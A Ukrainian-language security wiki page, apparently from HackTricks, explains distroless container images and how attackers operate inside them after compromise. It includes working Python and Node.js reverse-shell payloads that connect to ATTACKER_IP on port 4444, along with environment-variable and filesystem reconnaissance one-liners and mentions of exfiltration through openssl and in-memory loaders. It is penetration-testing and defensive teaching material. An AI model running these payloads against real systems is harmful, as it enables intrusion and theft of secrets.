# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

**Distroless**-образ контейнера містить **мінімальні компоненти середовища виконання, необхідні для запуску однієї конкретної програми**, водночас навмисно вилучаючи типові інструменти дистрибутива, як-от менеджери пакетів, оболонки та великі набори універсальних утиліт користувацького простору. На практиці distroless-образи часто містять лише бінарний файл програми або середовище виконання, її спільні бібліотеки, пакети сертифікатів і дуже мінімальну структуру файлової системи. <sup>[[1]](#references)</sup>

Ідеться не про те, що distroless — це новий примітив ізоляції ядра. Distroless — це **стратегія проєктування образу**. Вона змінює те, що доступно **всередині** файлової системи контейнера, а не те, як ядро ізолює контейнер. Це важлива відмінність, оскільки distroless зміцнює середовище переважно завдяки скороченню доступних зловмиснику засобів після отримання виконання коду. Він не замінює namespaces, seccomp, capabilities, AppArmor, SELinux чи будь-який інший механізм ізоляції середовища виконання.

## Навіщо потрібен Distroless

Distroless-образи використовують насамперед, щоб зменшити:

- розмір образу
- операційну складність образу
- кількість пакетів і бінарних файлів, що можуть містити вразливості
- кількість інструментів post-exploitation, доступних зловмиснику за замовчуванням

Саме тому distroless-образи популярні для розгортання робочих застосунків. Контейнер без оболонки, менеджера пакетів і майже без універсальних інструментів зазвичай простіше експлуатувати в операційному плані й складніше інтерактивно використати після компрометації.

Приклади відомих сімейств distroless-подібних образів:

- distroless-образи Google <sup>[[1]](#references)</sup>
- посилені/мінімальні образи Chainguard <sup>[[2]](#references)</sup>

## Чим Distroless не є

Distroless-контейнер **не є**:

- автоматично rootless
- автоматично непривілейованим
- автоматично доступним лише для читання
- автоматично захищеним за допомогою seccomp, AppArmor або SELinux
- автоматично захищеним від виходу з контейнера

Distroless-образ усе ще можна запустити з `--privileged`, спільним використанням просторів імен хоста, небезпечними bind mount або змонтованим сокетом середовища виконання. У такому разі образ може бути мінімальним, але контейнер усе одно може бути критично небезпечним. Distroless змінює **поверхню атаки користувацького простору**, а не **межу довіри ядра**.

## Типові операційні характеристики

Після компрометації distroless-контейнера зазвичай одразу помітно, що звичні припущення більше не справджуються. Може не бути `sh`, `bash`, `ls`, `id`, `cat`, а іноді навіть середовища на основі libc, яке працює так, як очікують ваші звичні методи. Це впливає і на атаку, і на захист, адже відсутність інструментів змінює налагодження, реагування на інциденти та post-exploitation.

Найпоширеніші варіанти:

- середовище виконання програми є, але майже нічого іншого немає
- payload-и на основі оболонки не працюють, бо оболонки немає
- типові однорядкові команди для переліку даних не працюють, бо допоміжні бінарні файли відсутні
- часто також застосовуються засоби захисту файлової системи, як-от коренева файлова система лише для читання або `noexec` для доступних для запису розташувань tmpfs

Саме через таке поєднання зазвичай говорять про «weaponizing distroless».

## Distroless і Post-Exploitation

Головна проблема атакувальника в distroless-середовищі — не завжди початковий RCE. Часто складність полягає в тому, що робити далі. Якщо вразливий застосунок дає змогу виконувати код у середовищі виконання мови, як-от Python, Node.js, Java або Go, можна виконувати довільну логіку, але не звичними робочими процесами, орієнтованими на оболонку, які поширені на інших Linux-цілях.

Тому post-exploitation часто розвивається в одному з трьох напрямів:

1. **Безпосередньо використати наявне середовище виконання мови**, щоб дослідити середовище, відкрити сокети, прочитати файли або підготувати додаткові payload-и.
2. **Завантажити власні інструменти в пам’ять**, якщо файлова система доступна лише для читання або доступні для запису розташування змонтовані з `noexec`.
3. **Зловживати наявними в образі бінарними файлами**, якщо програма або її залежності містять щось несподівано корисне.

## Зловживання

### Дослідіть наявне середовище виконання

У багатьох distroless-контейнерах немає оболонки, але є середовище виконання програми. Якщо ціль — сервіс на Python, там є Python. Якщо ціль — Node.js, там є Node. Цього часто достатньо, щоб переглядати файли, читати змінні середовища, відкривати reverse shell і запускати код у пам’яті, жодного разу не викликаючи `/bin/sh`.

Простий приклад із Python:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Простий приклад із Node.js:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Вплив:

- отримання змінних середовища, які часто містять облікові дані або адреси сервісів
- перегляд файлової системи без `/bin/ls`
- виявлення шляхів, доступних для запису, та змонтованих секретів

### Інтерактивне середовище виконання без `/bin/sh`

Якщо образ не містить `sh` або `bash`, класична reverse shell на основі shell не спрацює. У такому разі відкрийте інтерактивний сеанс у встановленому середовищі виконання мови програмування замість запуску неіснуючої оболонки.

Наприклад, цей payload на Python перенаправляє інтерактивну консоль Python через сокет:

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

Еквівалентний підхід у Node.js може виконувати JavaScript, отриманий через сокет. Це JavaScript REPL, а не оболонка операційної системи; файлові операції, роботу з процесами та мережеві операції потрібно виконувати за допомогою API Node.js:

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

Обидва приклади потребують вихідного мережевого з’єднання та доступного інтерпретатора й надають лише функціональність, яку забезпечує цей інтерпретатор.

Якщо образ несподівано містить `/bin/sh`, класичні shell-payload-и з використанням інтерпретатора залишаються корисними. Їх наведено окремо, оскільки вони насправді не обходяться без shell:

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

Старий шаблон циклу команд у Python також корисний, коли `/bin/sh` існує, але інтерактивний PTY незручний. Його наведено тут із чітким зазначенням реальної залежності: `subprocess.run(..., shell=True)` запускає системну оболонку, а отже, **не** є технікою без оболонки.

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### Повний приклад: цикл команд Python без shell

Якщо в образі є Python, але зовсім немає shell, локальний REPL Python усе одно дає змогу перевіряти файлову систему, змінні середовища та мережу:

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

Цей цикл не викликає `/bin/sh`. Він безпосередньо виконує вирази та інструкції Python, тому замість команд оболонки потрібно використовувати API Python. Попри це обмеження, він усе ще може забезпечити значну частину можливостей базової оболонки: перелічувати файлову систему й змінні середовища, отримувати доступ до даних, виконувати мережеві дії та розміщувати додаткові payloads за допомогою встановленого runtime.

### Виконання інструментів у пам’яті

Distroless-образи часто поєднують із такими налаштуваннями:

- `readOnlyRootFilesystem: true`
- доступний для запису `noexec` tmpfs, наприклад `/dev/shm`
- відсутність інструментів керування пакетами

За такого поєднання класичний сценарій «завантажити бінарний файл на диск і запустити його» стає ненадійним. У таких випадках основним рішенням стають методи виконання в пам’яті.

Окрема сторінка про це:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Найдоречніші методи на цій сторінці:

- `memfd_create` + `execve` через скриптові runtime <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

Для сервісу на Python, Node.js або PHP точкою входу може бути вразливість застосунку, наприклад template injection, prototype pollution або небезпечне виконання коду. Якщо це дає змогу виконувати код у процесі, метод із `/proc/self/mem` може запустити завантажувач без оболонки чи виконуваного файла на диску. Виконання й надалі відбувається з правами облікового запису процесу контейнера; для виходу з контейнера потрібна окрема вразливість у runtime або межі ізоляції хоста. Вимоги див. у [методах для read-only/noexec/distroless](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md).

### Наявні у образі бінарні файли

Деякі distroless-образи все ще містять бінарні файли, необхідні для роботи, які можуть стати корисними після компрометації. Один із часто спостережуваних прикладів — `openssl`, оскільки застосункам іноді потрібен він для завдань, пов’язаних із криптографією або TLS.

Швидкий шаблон пошуку:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

Якщо присутній `openssl`, його можна використовувати для:

- вихідних TLS-з’єднань
- exfiltration даних через дозволений канал вихідного трафіку
- підготовки даних payload у вигляді закодованих/зашифрованих blob-об’єктів

Точний спосіб зловживання залежить від того, що саме встановлено, але загальна ідея полягає в тому, що distroless не означає «зовсім без інструментів»; це означає «значно менше інструментів, ніж у звичайному образі дистрибутива».

## Перевірки

Мета цих перевірок — визначити, чи є образ насправді distroless на практиці та які бінарні файли середовища виконання або допоміжні бінарні файли все ще доступні для post-exploitation.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

Що тут цікаво:

- Якщо shell відсутній, але доступне середовище виконання, як-от Python або Node, post-exploitation варто переключити на виконання через середовище виконання.
- Якщо коренева файлова система доступна лише для читання, а `/dev/shm` доступний для запису, але має прапорець `noexec`, техніки виконання з пам’яті стають значно актуальнішими.
- Якщо доступні допоміжні бінарні файли, як-от `openssl`, `busybox` або `java`, вони можуть надати достатньо функціональності, щоб підготувати подальший доступ.

## Стандартні налаштування середовища виконання

| Стиль образу / платформи | Стандартний стан | Типова поведінка | Поширене ручне послаблення захисту |
| --- | --- | --- | --- |
| Образи Google у стилі distroless | Мінімальне користувацьке середовище за задумом | Немає shell, менеджера пакетів; лише залежності застосунку / середовища виконання | Додавання шарів для налагодження, sidecar-контейнерів із shell, копіювання busybox або інструментів |
| Мінімальні образи Chainguard | Мінімальне користувацьке середовище за задумом | Зменшена поверхня пакетів, часто зосереджена на одному середовищі виконання або службі | Використання варіантів `:latest-dev` або для налагодження, копіювання інструментів під час збірки |
| Навантаження Kubernetes з образами distroless | Залежить від конфігурації Pod | Distroless впливає лише на користувацьке середовище; рівень безпеки Pod усе ще залежить від специфікації Pod і стандартних налаштувань середовища виконання | Додавання тимчасових контейнерів для налагодження, монтування хоста, налаштування Pod із привілеями |
| Docker / Podman із запуском образів distroless | Залежить від параметрів запуску | Мінімальна файлова система, але безпека середовища виконання все ще залежить від параметрів і конфігурації демона | `--privileged`, спільне використання просторів імен хоста, монтування сокетів середовища виконання, доступні для запису монтування хоста |

Важливо пам’ятати, що distroless — це **властивість образу**, а не захист середовища виконання. Його цінність полягає в зменшенні кількості доступних компонентів у файловій системі після компрометації. Багатоетапні збірки — поширений спосіб не включати інструменти збірки до кінцевого образу. <sup>[[3]](#references)</sup>
